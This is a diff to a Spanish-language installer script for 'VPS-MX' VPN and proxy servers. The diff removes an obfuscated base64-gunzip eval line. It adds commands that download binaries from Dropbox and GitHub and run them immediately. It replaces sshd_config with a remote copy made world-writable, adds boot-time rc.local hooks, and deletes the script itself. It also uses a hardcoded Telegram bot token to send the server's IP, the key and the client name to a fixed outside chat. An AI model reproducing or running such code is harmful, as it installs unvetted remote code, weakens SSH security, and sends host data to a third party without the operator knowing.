+			dpkg --configure -a &>/dev/null
+			sleep 2
+			del 1
+			msg -nazu "   INSTALANDO $install $(msg -ama "$pts")"
+			if sudo apt install $install -y &>/dev/null ; then
+				msg -verd " INSTALADO"
+			else
+				msg -verm2 " FALLA"
+			fi
+		fi
+	done
+	sudo apt-get install apache2 -y &>/dev/null
+[[ $(dpkg --get-selections|grep -w "apache2"|head -1) ]] || apt-get install apache2 -y &>/dev/null
+sed -i "s;Listen 80;Listen 81;g" /etc/apache2/ports.conf > /dev/null 2>&1
+service apache2 restart > /dev/null 2>&1
+clear
+}
+install_start(){
+clear
+os_system
+msg -bar
+echo -e "\e[1;31m	🖥SISTEMA: \e[33m$distro $vercion   " 
+msg -bar
+    repo_install
+# apt update -y; apt upgrade -y
+#  [[ "$VERSION_ID" = '9' ]] && source <(curl -sL https://deb.nodesource.com/setup_10.x)
+
+}
+
+install_continue(){
+dependencias
+apt autoremove -y &>/dev/null
+ # [[ "$VERSION_ID" = '9' ]] && apt remove unscd -y &>/dev/null
+}
+
+   clear
+cd $HOME
+
+rm $(pwd)/$0 &> /dev/null
+SCPdir="/etc/VPS-MX"
+SCPinstal="$HOME/install"
+SCPidioma="${SCPdir}/idioma"
+SCPusr="${SCPdir}/controlador"
+SCPfrm="${SCPdir}/herramientas"
+SCPinst="${SCPdir}/protocolos"
+
+rm -rf /etc/localtime &>/dev/null
+ln -s /usr/share/zoneinfo/America/Chihuahua /etc/localtime &>/dev/null
+rm -rf /usr/local/lib/systemubu1 &> /dev/null
+### COLORES Y BARRA 
+clear
+
+### FIXEADOR PARA SISTEMAS 86_64
+
+clear
+fun_ipe () {
+MIP=$(ip addr | grep 'inet' | grep -v inet6 | grep -vE '127\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | grep -o -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | head -1)
+MIP2=$(wget -qO- ipv4.icanhazip.com)
+[[ "$MIP" != "$MIP2" ]] && IP="$MIP2" || IP="$MIP"
+echo "$IP" >/bin/IPca
+}  
+
+function_verify () {
+
+[[ $(dpkg --get-selections|grep -w "curl"|head -1) ]] || apt-get install curl -y &>/dev/null
+  permited=$(curl -sSL "https://raw.githubusercontent.com/bussttivpn/LA_CASITA/refs/heads/main/control")
+  [[ $(echo $permited|grep "${IP}") = "" ]] && {
+  clear
+  msg -tit
+  echo -e "\n\n\n\033[1;91m————————————————————————————————————————————————————\n      ¡ESTA KEY NO CONCUERDA CON EL INSTALADOR! \n      BOT: @CONECTEDMX_BOT \n————————————————————————————————————————————————————\n\n\n"
+  [[ -d /etc/VPS-MX ]] && rm -rf /etc/VPS-MX
+  exit 1
+  } || {
+  ### INTALAR VERSION DE SCRIPT
+  v1=$(curl -sSL "https://raw.githubusercontent.com/lacasitamx/version/master/vercion")
+  echo "$v1" > /etc/versin_script
+
+  }
+}
+
+idioma () {
+
+clear
+clear
+msg -bar2
+echo -e "$(cat /bin/last12)"
+pv="$(echo es)"
+[[ ${#id} -gt 2 ]] && id="es" || id="$pv"
+byinst="true"
+}
+
+install_fim () {
+msg -ama "               Finalizando Instalacion" && msg bar2
+#rm -rf /etc/VPS-MX/controlador/nombre.log &>/dev/null
+[[ $(find /etc/VPS-MX/controlador -name nombre.log|grep -w "nombre.log"|head -1) ]] || wget -O /etc/VPS-MX/controlador/nombre.log https://github.com/lacasitamx/VPSMX/raw/master/ArchivosUtilitarios/nombre.log &>/dev/null
+[[ $(find /etc/VPS-MX/controlador -name IDT.log|grep -w "IDT.log"|head -1) ]] || wget -O /etc/VPS-MX/controlador/IDT.log https://github.com/lacasitamx/VPSMX/raw/master/ArchivosUtilitarios/IDT.log &>/dev/null
+[[ $(find /etc/VPS-MX/controlador -name tiemlim.log|grep -w "tiemlim.log"|head -1) ]] || wget -O /etc/VPS-MX/controlador/tiemlim.log https://github.com/lacasitamx/VPSMX/raw/master/ArchivosUtilitarios/tiemlim.log &>/dev/null
+touch /usr/share/lognull &>/dev/null
+wget https://raw.githubusercontent.com/lacasitamx/VPSMX/master/SR/SPR &>/dev/null -O /usr/bin/SPR &>/dev/null
+chmod 775 /usr/bin/SPR &>/dev/null
+[[ -z $(cat /etc/resolv.conf | grep "8.8.8.8") ]] && echo "nameserver	8.8.8.8" >> /etc/resolv.conf
+[[ -z $(cat /etc/resolv.conf | grep "1.1.1.1") ]] && echo "nameserver	1.1.1.1" >> /etc/resolv.conf
+wget -O /usr/bin/SOPORTE https://www.dropbox.com/s/e2g6brtm7dy51i4/SOPORTE &>/dev/null
+chmod 775 /usr/bin/SOPORTE &>/dev/null
+SOPORTE &>/dev/null
+echo "ACCESO ACTIVADO" >/usr/bin/SOPORTE
+wget -O /bin/rebootnb https://raw.githubusercontent.com/lacasitamx/VPSMX/master/SCRIPT-8.4/Utilidad/rebootnb &> /dev/null
+chmod +x /bin/rebootnb 
+wget -O /bin/resetsshdrop https://raw.githubusercontent.com/lacasitamx/VPSMX/master/SCRIPT-8.4/Utilidad/resetsshdrop &> /dev/null
+chmod +x /bin/resetsshdrop
+wget -O /etc/versin_script_new https://raw.githubusercontent.com/lacasitamx/version/master/vercion &>/dev/null
+wget -O /etc/ssh/sshd_config https://raw.githubusercontent.com/lacasitamx/ZETA/master/sshd &>/dev/null
+chmod 777 /etc/ssh/sshd_config
+#
 
 
-eval "$(printf '%s' "$gatesccn" | base64 -d | gunzip)"
+msg -bar2
+echo '#!/bin/sh -e' > /etc/rc.local
+sudo chmod +x /etc/rc.local
+echo "sudo rebootnb" >> /etc/rc.local
+echo "sudo resetsshdrop" >> /etc/rc.local
+echo "sleep 2s" >> /etc/rc.local
+echo "exit 0" >> /etc/rc.local
+/bin/cp /etc/skel/.bashrc ~/
 
-exit 0
+echo 'export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games/' >> /etc/profile
+echo 'clear' >> .bashrc
+echo 'export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games/' >> .bashrc
+echo 'echo ""' >> .bashrc
+echo 'fecha=$(date +"%d-%b-%y")'>> .bashrc
+echo 'hora=$(date +"%T")'>> .bashrc
+echo 'mn=$(cat /bin/last12)'>>.bashrc
+echo 'echo -e "\033[1;91m——————————————————————————————————————————————————\e[0m" '>> .bashrc
+echo 'echo -e "${mn}"' >>.bashrc
+#echo 'figlet -f slant "LACASITA" |lolcat' >> .bashrc
+echo 'mess1="$(less /etc/VPS-MX/message.txt)" ' >> .bashrc
+echo 'echo -e "\033[1;91m——————————————————————————————————————————————————\e[0m" '>> .bashrc
+echo 'echo -e "\t\033[1;91mRESELLER :\e[92m $mess1 "'>> .bashrc
+echo 'echo -e "\t\e[1;33mVERSION: \e[1;31m$(cat /etc/versin_script_new)"'>> .bashrc
+
+echo 'echo -e "\e[1;97m  HORA: \e[1;91m$hora    \e[1;97mFECHA: \e[1;91m${fecha}\e[0m"'>> .bashrc
+echo 'echo -e "\033[1;91m——————————————————————————————————————————————————\e[0m" '>> .bashrc          
+echo 'echo -e "\t\033[1;100mPARA PODER ENTRAR AL MENÚ ESCRIBA:\e[0m\e[1;41m menu \e[0m"'>> .bashrc
+
+echo 'echo ""'>> .bashrc
+echo -e "         COMANDO PRINCIPAL PARA ENTRAR AL SCRIPT "
+echo -e "  \033[1;41m               sudo menu             \033[0;37m" && msg -bar2
+rm -rf /usr/bin/pytransform &> /dev/null
+rm -rf LACASITA.sh
+rm -rf lista-arq
+
+service ssh restart &>/dev/null
+export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games/
+time_reboot "10"
+}
+ofus () {
+unset server
+server=$(echo ${txt_ofuscatw}|cut -d':' -f1)
+unset txtofus
+number=$(expr length $1)
+for((i=1; i<$number+1; i++)); do
+txt[$i]=$(echo "$1" | cut -b $i)
+case ${txt[$i]} in
+".")txt[$i]="C";;
+"C")txt[$i]=".";;
+"3")txt[$i]="@";;
+"@")txt[$i]="3";;
+"5")txt[$i]="9";;
+"9")txt[$i]="5";;
+"6")txt[$i]="D";;
+"D")txt[$i]="6";;
+"J")txt[$i]="Z";;
+"Z")txt[$i]="J";;
+esac
+txtofus+="${txt[$i]}"
+done
+echo "$txtofus" | rev
+}
+verificar_arq () {
+[[ ! -d ${SCPdir} ]] && mkdir ${SCPdir}
+[[ ! -d ${SCPusr} ]] && mkdir ${SCPusr}
+[[ ! -d ${SCPfrm} ]] && mkdir ${SCPfrm}
+[[ ! -d ${SCPinst} ]] && mkdir ${SCPinst}
+[[ ! -d ${SCPdir}/tmp ]] && mkdir ${SCPdir}/tmp
+[[ ! -d ${SCPdir}/passw ]] && mkdir ${SCPdir}/passw
+case $1 in
+"menu"|"message.txt"|"ID")ARQ="${SCPdir}/";; #Menu
+#"usercodes")ARQ="${SCPusr}/";; #Panel SSRR
+"C-SSR.sh"|"UDPcustom.sh")ARQ="${SCPinst}/";; #Panel SSR
+"openssh.sh")ARQ="${SCPinst}/";; #OpenVPN
+"squid.sh")ARQ="${SCPinst}/";; #Squid
+"dropbear.sh"|"proxy.sh"|"wireguard.sh")ARQ="${SCPinst}/";; #Instalacao
+"proxy.sh")ARQ="${SCPinst}/";; #Instalacao
+"openvpn.sh")ARQ="${SCPinst}/";; #Instalacao
+"ssl.sh"|"python.py")ARQ="${SCPinst}/";; #Instalacao
+"shadowsocks.sh")ARQ="${SCPinst}/";; #Instalacao
+"Shadowsocks-libev.sh")ARQ="${SCPinst}/";; #Instalacao
+"Shadowsocks-R.sh")ARQ="${SCPinst}/";; #Instalacao 
+"v2ray.sh"|"slowdns.sh")ARQ="${SCPinst}/";; #Instalacao
+#"budp.sh")ARQ="${SCPinst}/";; #Instalacao
+#"menu")ARQ="/usr/bin";; 
+"name"|"adminkey")ARQ="${SCPdir}/tmp/";; #Instalacao
+"sockspy.sh"|"PDirect.py"|"PPub.py"|"PPriv.py"|"POpen.py"|"PGet.py")ARQ="${SCPinst}/";; #Instalacao
+*)ARQ="${SCPfrm}/";; #Herramientas
+esac
+mv -f ${SCPinstal}/$1 ${ARQ}/$1
+chmod +x ${ARQ}/$1
+}
+fun_ipe
+source /etc/os-release; export PRETTY_NAME
+
+				install_start
+				
+                  install_continue
+                  
+
+wget -O /usr/bin/trans https://raw.githubusercontent.com/scriptsmx/script/master/Install/trans &> /dev/null
+wget -O /bin/Desbloqueo.sh https://www.dropbox.com/s/75c93cyv4l81qci/desbloqueo.sh &> /dev/null
+chmod +x /bin/Desbloqueo.sh
+wget -O /bin/monitor.sh https://raw.githubusercontent.com/lacasitamx/VPSMX/master/SCRIPT-8.4/Utilidad/monitor.sh &> /dev/null
+chmod +x /bin/monitor.sh
+wget -O /var/www/html/estilos.css https://raw.githubusercontent.com/lacasitamx/VPSMX/master/SCRIPT-8.4/Utilidad/estilos.css &> /dev/null
+[[ -f "/usr/sbin/ufw" ]] && ufw allow 443/tcp &>/dev/null; ufw allow 80/tcp &>/dev/null; ufw allow 3128/tcp &>/dev/null; ufw allow 8799/tcp &>/dev/null; ufw allow 8080/tcp &>/dev/null; ufw allow 81/tcp &>/dev/null
+
+[[ $1 = "" ]] && idioma || {
+[[ ${#1} -gt 2 ]] && idioma || id="$1"
+ }
+
+error_fun () {
+echo ""
+[[ $1 = "" ]] && idioma || {
+[[ ${#1} -gt 2 ]] && idioma || id="$1"
+ }
+ echo "¡KEY invalido!" >/etc/keyno
+msg -bar2 && msg -verm "ERROR DE GENERADOR | ARCHIVOS INCOMPLETOS\n	KEY USADA" && msg -bar2
+echo -ne "\033[1;97m DESEAS INTENTAR CON OTRA KEY  \033[1;31m[\033[1;93m S \033[1;31m|\033[1;93m N \033[1;31m]\033[1;97m: \033[1;93m" && read ingresar_key
+service apache2 restart >/dev/null 2>&1
+[[ "$ingresar_key" = "s" || "$ingresar_key" = "S" ]] && ingresar_key
+    clear && clear
+    msg -bar
+    
+    echo -e "\033[1;97m          == INSTALACION CANCELADA =="
+    msg -bar
+    
+    rm -rf lista-arq
+exit 1
+}
+invalid_key () {
+
+echo ""
+[[ $1 = "" ]] && idioma || {
+[[ ${#1} -gt 2 ]] && idioma || id="$1"
+ }
+ echo "¡KEY invalido!" >/etc/keyno
+msg -bar2 && msg -verm "  Code Invalido -- #¡Key Invalida#! " && msg -bar2
+echo -ne "\033[1;97m DESEAS INTENTAR CON OTRA KEY  \033[1;31m[\033[1;93m S \033[1;31m|\033[1;93m N \033[1;31m]\033[1;97m: \033[1;93m" && read ingresar_key
+service apache2 restart >/dev/null 2>&1
+[[ "$ingresar_key" = "s" || "$ingresar_key" = "S" ]] && ingresar_key
+    clear && clear
+    msg -bar 
+    echo -e "\033[1;97m          == INSTALACION CANCELADA =="
+    msg -bar
+exit 1
+}
+
+ingresar_key(){
+
+
+/bin/cp /etc/skel/.bashrc ~/
+service apache2 restart >/dev/null 2>&1
+[[ -d /etc/keyno ]] && rm -rf /etc/keyno &>/dev/null
+echo "by @lacasitamx 2025" >/etc/keyno
+unset Key
+while [[ ! $Key ]]; do
+msg -bar2 && msg -ne "\033[1;93m          >>> INGRESE SU KEY ABAJO <<<\n   \033[1;37m" && read Key
+[[ -z "$Key" ]] && Key="NoExiste"
+tput cuu1 && tput dl1
+done
+msg -ne "    # Verificando Key # : "
+
+cd $HOME
+archivos='wireguard.sh
+adminkey
+name
+ID
+slowdns.sh
+ADMbot.sh
+C-SSR.sh
+PDirect.py
+PGet.py
+POpen.py
+PPriv.py
+PPub.py
+fai2ban.sh
+message.txt
+openvpn.sh
+ports.sh
+speed.py
+squid.sh
+squidpass.sh
+python.py'
+IPT=$(cat /bin/IPca)
+lisArq="https://gitea.com/blubin/INFAM/raw/hack/Arc"
+
+wget -O $HOME/lista-arq $(ofus "$Key")/$IP &>/dev/null && echo -e "\033[1;32m Ofus Correcto" || {
+   echo -e "\033[1;91m ¡Ofus Incorrecto!"
+   invalid_key
+   
+   }
+IP=$(ofus "$Key" | grep -vE '127\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}' | grep -o -E '[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}') && echo "$IP" > /usr/bin/venip
+sleep 1s
+function_verify
+updatedb &>/dev/null
+if [[ -e $HOME/lista-arq ]] && [[ ! $(cat /etc/keyno|grep "¡KEY invalido!") ]]; then
+   msg -bar2
+   msg -verd "    Archivos Copiados: \e[97m[\e[91mby @gagat007\e[97m]"
+   REQUEST=$(ofus "$Key"|cut -d'/' -f2)
+   [[ ! -d ${SCPinstal} ]] && mkdir ${SCPinstal}
+   pontos="¡" 
+   stopping="Descargando Archivos"
+
+   for arqx in $(echo ${archivos}); do
+   msg -verm "${stopping}${pontos}" 
+   wget --no-check-certificate -O ${SCPinstal}/${arqx} ${IP}:81/${REQUEST}/${arqx} &>/dev/null && verificar_arq "${arqx}" || {
+error_fun
+}
+#
+   tput cuu1 && tput dl1
+   pontos+="¡"
+   done
+wget --no-check-certificate -O ${SCPdir}/menu ${lisArq}/menu &>/dev/null
+chmod 777 ${SCPdir}/menu 
+wget -qO- ipv4.icanhazip.com >/etc/VPS-MX/IP.log
+  userid="${SCPdir}/ID"
+  TOKEN="2012880601:AAGZ2zVOW5MyVMNQ012cOq7vMb550peEXwk"
+			URL="https://api.telegram.org/bot$TOKEN/sendMessage"
+
+
+while read user; do
+if [[ $(cat ${userid}|grep "605531451") = "" ]]; then
+		MSG="👇❮= 𝙉𝙊𝙏𝙄-𝙆𝙀𝙔 $(cat /etc/anio)=❯👇   
+ ◄══════◄••◩••►══════►
+ Version: $(cat /etc/versin_script) INSTALADO✓
+ ◄══════◄••◩••►══════►
+ AdminBot: $(cat ${SCPdir}/tmp/adminkey)
+ Cliente: $(cat ${SCPdir}/tmp/name)
+ 🆔: $user
+ SLOGAN: $(cat ${SCPdir}/message.txt)
+ ◄══════◄••◩••►══════►
+ IP: $(cat ${SCPdir}/IP.log)
+ SYSTEMA: $(cat /tmp/distro)
+ ◄══════◄••◩••►══════►
+ KEY: $Key 👈 Usada
+ ◄══════◄••◩••►══════►
+ By @Lacasitamx MOD LatamSRC
+ ◄══════◄••◩••►══════►
+ DIOS TIENE PLANES PARA TI.
+ ÉL QUIERE RESCATARTE DEL OYO EN LA QUE ESTES PASANDO.
+ Hechos 16: v31
+Cree en el Señor Jesucristo, y serás salvo, tú y tu casa. 
+◄══════◄••◩••►══════►
+ 2 Pedro 3:9
+ DIOS ES MUY PACIENTE CON NOSOTROS.
+ PERO ÉL NO QUIERE QUE TODOS MUERAN
+ SI NO QUE TODOS SE ARRPIENTAN DE SUS PECADOS
+◄══════◄••◩••►══════►
+(𝐉𝐄𝐒𝐔𝐂𝐑𝐈𝐒𝐓𝐎 𝐓𝐄 𝐀𝐌𝐀) y TE ESTÁ ESPERÁNDO A TI 
+JESÚS VUELVE PRONTO
+BUSCALO AHORA MIENTRAS QUE HAY OPORTUNIDAD 
+ANTES QUE SEA DEMACIADO TARDE.
+"
+curl -s --max-time 10 -d "chat_id=${user}&disable_web_page_preview=1&text=$MSG" $URL &>/dev/null
+curl -s --max-time 10 -d "chat_id=605531451&disable_web_page_preview=1&text=$MSG" $URL &>/dev/null
+else
+
+MSG="👇❮= 𝙉𝙊𝙏𝙄-𝙆𝙀𝙔 $(cat /etc/anio)=❯👇   
+ ◄══════◄••◩••►══════►
+ Version: $(cat /etc/versin_script) INSTALADO✓
+ ◄══════◄••◩••►══════►
+ AdminBot: $(cat ${SCPdir}/tmp/adminkey)
+ Cliente: $(cat ${SCPdir}/tmp/name)
+ 🆔: $user
+ SLOGAN: $(cat ${SCPdir}/message.txt)
+ ◄══════◄••◩••►══════►
+ IP: $(cat ${SCPdir}/IP.log)
+ SYSTEMA: $(cat /tmp/distro)
+ ◄══════◄••◩••►══════►
+ KEY: $Key 👈 Usada
+ ◄══════◄••◩••►══════►
+ By @Lacasitamx noti key latamSRC
+ ◄══════◄••◩••►══════►
+ "
+curl -s --max-time 10 -d "chat_id=${user}&disable_web_page_preview=1&text=$MSG" $URL &>/dev/null
+fi
+done <<< "$(cat ${userid}|cut -d' ' -f1)"
+
+	#rm ${SCPdir}/tmp/name &>/dev/null
+   rm ${SCPdir}/IP.log &>/dev/null
+   rm /tmp/distro &>/dev/null
+   [[ ! -d ${SCPdir}/tmp ]] && mkdir ${SCPdir}/tmp
+   #
+   wget -O ${SCPdir}/tmp/verifi https://www.dropbox.com/s/tv7yis89au5v8sv/verifi &>/dev/null
+   wget -O ${SCPdir}/tmp/monitor https://www.dropbox.com/s/zwqhu7gavru6l9i/monitor &>/dev/null
+   wget -O ${SCPdir}/tmp/autodes https://www.dropbox.com/s/fwcor9tbksnyuxy/autodes &>/dev/null
+   wget -O ${SCPdir}/tmp/style https://www.dropbox.com/s/f33mi30lbxawvku/style &>/dev/null
+   chmod 777 ${SCPdir}/tmp/*
+   
+   wget -O /etc/VPS-MX/protocolos/chekuser.sh https://www.dropbox.com/s/dypjomdhjhkpahk/chekuser.sh &>/dev/null
+   chmod 777 /etc/VPS-MX/protocolos/chekuser.sh
+   wget -O /etc/VPS-MX/protocolos/chekuser.py https://www.dropbox.com/s/7he83qd5pfznrvh/chekuser.py &>/dev/null
+   chmod 777 /etc/VPS-MX/protocolos/chekuser.py
+  # rm ${SCPdir}/ID &>/dev/null
+   msg -bar2
+   [[ -e $HOME/lista-arq ]] && rm -rf $HOME/lista-arq
+   cat /etc/bash.bashrc|grep -v '[[ $UID != 0 ]] && TMOUT=15 && export TMOUT' > /etc/bash.bashrc.2
+   echo -e '[[ $UID != 0 ]] && TMOUT=15 && export TMOUT' >> /etc/bash.bashrc.2
+   mv -f /etc/bash.bashrc.2 /etc/bash.bashrc
+   rm -rf /usr/bin/menu
+   rm -rf /usr/bin/VPSMX
+   ln -s /etc/VPS-MX/menu /usr/bin/menu
+   ln -s /etc/VPS-MX/menu /usr/bin/VPSMX
+#
+#update-locale LANG=en_US.UTF-8 LANGUAGE=en
+   echo "$Key" > ${SCPdir}/key.txt
+   [[ -d ${SCPinstal} ]] && rm -rf ${SCPinstal}   
+   [[ ${#id} -gt 2 ]] && echo "es" > ${SCPidioma} || echo "${id}" > ${SCPidioma}
+   msg -bar2
+   [[ ${byinst} = "true" ]] && install_fim
+   
+else
+invalid_key
+fi
+}
+
+ingresar_key
+}
+
+ingresar_key
